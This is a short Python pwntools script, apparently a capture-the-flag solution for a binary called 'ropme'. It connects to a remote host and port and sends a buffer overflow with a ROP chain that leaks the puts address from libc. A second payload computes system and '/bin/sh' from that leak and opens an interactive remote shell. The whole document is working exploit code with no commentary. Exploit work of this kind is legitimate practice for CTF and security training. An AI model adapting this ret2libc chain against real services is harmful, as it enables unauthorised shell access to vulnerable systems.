from pwn import *
elf = context.binary = ELF('./ropme')
libc = elf.libc

local = False

if local:
    p = elf.process()
else:
    host = '64.227.39.89'
    port = 31299
    p = remote(host,port)

rop = ROP([elf])

PUTS_PLT = p64(elf.plt['puts'])
PUTS_GOT = p64(elf.got['puts'])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
main = p64(elf.sym['main'])

payload1 = b'A'*72 + pop_rdi + PUTS_GOT + PUTS_PLT + main

p.clean()
p.sendline(payload1)

print(p.recvline())
data = p.recvline().strip()
print(data)
leak = u64(data.ljust(8,b"\x00"))
libc.address = leak - libc.sym['puts']
print("[+] Libc Address:  " + str(hex(libc.address)))

binsh = p64(next(libc.search(b'/bin/sh\x00')))
system = p64(libc.sym['system'])
ret = p64(rop.find_gadget(['ret'])[0])

payload2 = b'A'*72 + pop_rdi + binsh + system

p.clean()
p.sendline(payload2)

p.interactive()
